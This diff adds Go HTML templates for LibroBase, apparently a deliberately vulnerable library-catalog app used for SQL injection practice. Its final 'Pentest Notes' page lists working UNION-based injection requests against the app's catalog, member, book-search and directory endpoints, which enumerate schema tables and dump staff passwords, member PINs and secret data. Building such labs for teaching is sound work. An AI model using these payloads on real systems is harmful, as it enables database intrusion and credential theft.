@@ -1,0 +1,271 @@
+{{define "home.html"}}
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>{{.Title}}</title><link rel="stylesheet" href="/static/style.css"></head>
+<body>
+<header>
+  <a class="logo" href="/">Libro<span>Base</span></a>
+  <nav>
+    <a href="/catalog?genre=Technology">Technology</a>
+    <a href="/catalog?genre=Sci-Fi">Sci-Fi</a>
+    <a href="/books">Search</a>
+    <a href="/members">Members</a>
+    <a href="/docs" class="cta">Docs</a>
+  </nav>
+</header>
+<main>
+  <div class="hero">
+    <h1>LibroBase — Library Catalog</h1>
+    <p>Explore our curated collection of books across all genres.</p>
+  </div>
+  <div class="panel">
+    <h2>Recent Acquisitions</h2>
+    {{if .Data}}
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>ID</th><th>Title</th><th>Author</th><th>Genre</th><th>Year</th></tr></thead>
+        <tbody>
+          {{range .Data}}<tr>{{range .}}<td>{{.}}</td>{{end}}</tr>{{end}}
+        </tbody>
+      </table>
+    </div>
+    {{end}}
+  </div>
+</main>
+<footer><p>© 2024 LibroBase · Public Library System &nbsp;|&nbsp; <a href="/docs">Pentest Docs</a></p></footer>
+<script src="/static/script.js"></script>
+</body></html>
+{{end}}
+
+{{define "catalog.html"}}
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>{{.Title}}</title><link rel="stylesheet" href="/static/style.css"></head>
+<body>
+<header>
+  <a class="logo" href="/">Libro<span>Base</span></a>
+  <nav>
+    <a href="/books">Search</a>
+    <a href="/members">Members</a>
+    <a href="/authors">Directory</a>
+    <a href="/docs" class="cta">Docs</a>
+  </nav>
+</header>
+<main>
+  <div class="panel">
+    <h2>Browse by Genre</h2>
+    <div class="genre-tabs">
+      <a href="/catalog?genre=Technology">Technology</a>
+      <a href="/catalog?genre=Sci-Fi">Sci-Fi</a>
+      <a href="/catalog?genre=Dystopia">Dystopia</a>
+      <a href="/catalog?genre=History">History</a>
+      <a href="/catalog?genre=Fiction">Fiction</a>
+      <a href="/catalog?genre=Self-Help">Self-Help</a>
+    </div>
+
+    {{if .Error}}<div class="alert alert-error">{{.Error}}</div>{{end}}
+
+    {{if .Data.Rows}}
+    <div class="table-wrap">
+      <table>
+        <thead><tr>{{range .Data.Cols}}<th>{{.}}</th>{{end}}</tr></thead>
+        <tbody>{{range .Data.Rows}}<tr>{{range .}}<td>{{.}}</td>{{end}}</tr>{{end}}</tbody>
+      </table>
+    </div>
+    {{else if .Data.Genre}}
+    <p style="color:var(--muted)">No books found in genre: <strong>{{.Data.Genre}}</strong></p>
+    {{end}}
+  </div>
+</main>
+<footer><p>© 2024 LibroBase &nbsp;|&nbsp; <a href="/docs">Docs</a></p></footer>
+<script src="/static/script.js"></script>
+</body></html>
+{{end}}
+
+{{define "members.html"}}
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>{{.Title}}</title><link rel="stylesheet" href="/static/style.css"></head>
+<body>
+<header>
+  <a class="logo" href="/">Libro<span>Base</span></a>
+  <nav>
+    <a href="/catalog">Catalog</a>
+    <a href="/books">Search</a>
+    <a href="/authors">Directory</a>
+    <a href="/docs" class="cta">Docs</a>
+  </nav>
+</header>
+<main>
+  <div class="panel">
+    <h2>Member Lookup</h2>
+    <p style="color:var(--muted);margin-bottom:1.25rem;font-family:sans-serif;font-size:.9rem">Enter a member ID to view their account details.</p>
+
+    <form class="search-row" method="GET" action="/members">
+      <input name="id" type="text" placeholder="Member ID (e.g. 1, 2, 3)" value="{{.Data.ID}}">
+      <button type="submit" class="btn btn-primary">Look Up</button>
+    </form>
+
+    {{if .Error}}<div class="alert alert-error">{{.Error}}</div>{{end}}
+
+    {{if .Data.Rows}}
+    <div class="table-wrap">
+      <table>
+        <thead><tr>{{range .Data.Cols}}<th>{{.}}</th>{{end}}</tr></thead>
+        <tbody>{{range .Data.Rows}}<tr>{{range .}}<td>{{.}}</td>{{end}}</tr>{{end}}</tbody>
+      </table>
+    </div>
+    {{end}}
+  </div>
+</main>
+<footer><p>© 2024 LibroBase &nbsp;|&nbsp; <a href="/docs">Docs</a></p></footer>
+<script src="/static/script.js"></script>
+</body></html>
+{{end}}
+
+{{define "books.html"}}
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>{{.Title}}</title><link rel="stylesheet" href="/static/style.css"></head>
+<body>
+<header>
+  <a class="logo" href="/">Libro<span>Base</span></a>
+  <nav>
+    <a href="/catalog">Catalog</a>
+    <a href="/members">Members</a>
+    <a href="/authors">Directory</a>
+    <a href="/docs" class="cta">Docs</a>
+  </nav>
+</header>
+<main>
+  <div class="panel">
+    <h2>Search Books</h2>
+    <form class="search-row" method="GET" action="/books">
+      <input name="title" type="text" placeholder="Search by title…" value="{{.Data.Query}}">
+      <button type="submit" class="btn btn-primary">Search</button>
+    </form>
+
+    {{if .Error}}<div class="alert alert-error">{{.Error}}</div>{{end}}
+
+    {{if .Data.Rows}}
+    <div class="table-wrap">
+      <table>
+        <thead><tr>{{range .Data.Cols}}<th>{{.}}</th>{{end}}</tr></thead>
+        <tbody>{{range .Data.Rows}}<tr>{{range .}}<td>{{.}}</td>{{end}}</tr>{{end}}</tbody>
+      </table>
+    </div>
+    {{else if .Data.Query}}
+    <p style="color:var(--muted)">No results for "<strong>{{.Data.Query}}</strong>".</p>
+    {{end}}
+  </div>
+</main>
+<footer><p>© 2024 LibroBase &nbsp;|&nbsp; <a href="/docs">Docs</a></p></footer>
+<script src="/static/script.js"></script>
+</body></html>
+{{end}}
+
+{{define "authors.html"}}
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>{{.Title}}</title><link rel="stylesheet" href="/static/style.css"></head>
+<body>
+<header>
+  <a class="logo" href="/">Libro<span>Base</span></a>
+  <nav>
+    <a href="/catalog">Catalog</a>
+    <a href="/books">Search</a>
+    <a href="/members">Members</a>
+    <a href="/docs" class="cta">Docs</a>
+  </nav>
+</header>
+<main>
+  <div class="panel">
+    <h2>Member Directory</h2>
+    <form class="search-row" method="GET" action="/authors">
+      <input name="name" type="text" placeholder="Search by member name…" value="{{.Data.Query}}">
+      <button type="submit" class="btn btn-primary">Search</button>
+    </form>
+
+    {{if .Error}}<div class="alert alert-error">{{.Error}}</div>{{end}}
+
+    {{if .Data.Rows}}
+    <div class="table-wrap">
+      <table>
+        <thead><tr>{{range .Data.Cols}}<th>{{.}}</th>{{end}}</tr></thead>
+        <tbody>{{range .Data.Rows}}<tr>{{range .}}<td>{{.}}</td>{{end}}</tr>{{end}}</tbody>
+      </table>
+    </div>
+    {{else if .Data.Query}}
+    <p style="color:var(--muted)">No members found for "<strong>{{.Data.Query}}</strong>".</p>
+    {{end}}
+  </div>
+</main>
+<footer><p>© 2024 LibroBase &nbsp;|&nbsp; <a href="/docs">Docs</a></p></footer>
+<script src="/static/script.js"></script>
+</body></html>
+{{end}}
+
+{{define "docs.html"}}
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>{{.Title}}</title><link rel="stylesheet" href="/static/style.css"></head>
+<body>
+<header>
+  <a class="logo" href="/">Libro<span>Base</span></a>
+  <nav><a href="/">← Home</a></nav>
+</header>
+<main>
+  <div class="docs">
+    <h1>Pentest Notes – LibroBase</h1>
+    <p class="sub">Security assessor reference. Internal use only.</p>
+
+    <div class="vuln-card">
+      <h3><span class="tag">UNION</span> VULN-5 · List DB Contents (non-Oracle / PostgreSQL)</h3>
+      <p>Endpoint: <code>GET /catalog?genre=X</code> — 3-column query (title, author, genre)</p>
+      <div class="code-block">GET /catalog?genre='+UNION+SELECT+table_name,table_schema,'t'+FROM+information_schema.tables--
+GET /catalog?genre='+UNION+SELECT+column_name,data_type,'c'+FROM+information_schema.columns+WHERE+table_name='staff'--
+GET /catalog?genre='+UNION+SELECT+username,password,'u'+FROM+staff--
+GET /catalog?genre='+UNION+SELECT+label,value,'s'+FROM+secret_data--</div>
+    </div>
+
+    <div class="vuln-card">
+      <h3><span class="tag">UNION</span> VULN-6 · List DB Contents (Oracle sim)</h3>
+      <p>Endpoint: <code>GET /members?id=X</code> — numeric param, 3 cols (name, email, membership)<br>
+      Oracle: <code>SELECT table_name FROM all_tables</code> → PG: <code>information_schema.tables</code></p>
+      <div class="code-block">GET /members?id=1+UNION+SELECT+table_name,table_schema,NULL+FROM+information_schema.tables--
+GET /members?id=1+UNION+SELECT+username,password,role+FROM+staff--
+GET /members?id=0+UNION+SELECT+name,pin,membership+FROM+members--
+# Oracle equivalent: 1 UNION SELECT table_name,NULL,NULL FROM all_tables--</div>
+    </div>
+
+    <div class="vuln-card">
+      <h3><span class="tag">UNION</span> VULN-7 · Determine Number of Columns</h3>
+      <p>Endpoint: <code>GET /books?title=X</code> — probe column count with ORDER BY then NULL</p>
+      <div class="code-block">GET /books?title='+ORDER+BY+1--    ← no error
+GET /books?title='+ORDER+BY+2--    ← no error
+GET /books?title='+ORDER+BY+3--    ← no error
+GET /books?title='+ORDER+BY+4--    ← ERROR → 3 columns confirmed
+GET /books?title='+UNION+SELECT+NULL,NULL,NULL--   ← success
+GET /books?title='+UNION+SELECT+version(),NULL,NULL--</div>
+    </div>
+
+    <div class="vuln-card">
+      <h3><span class="tag">UNION</span> VULN-8 · Find Column Containing Text</h3>
+      <p>Endpoint: <code>GET /authors?name=X</code> — cols: id(int), name(text), membership(text)</p>
+      <div class="code-block">GET /authors?name='+UNION+SELECT+'a',NULL,NULL--   ← ERROR (col 1 is int)
+GET /authors?name='+UNION+SELECT+NULL,'a',NULL--   ← SUCCESS (col 2 is text)
+GET /authors?name='+UNION+SELECT+NULL,'SQLI_TEST',NULL--
+GET /authors?name='+UNION+SELECT+NULL,username||':'||password,role+FROM+staff--</div>
+    </div>
+  </div>
+</main>
+<footer><p>© 2024 LibroBase – Internal</p></footer>
+<script src="/static/script.js"></script>
+</body></html>
+{{end}}
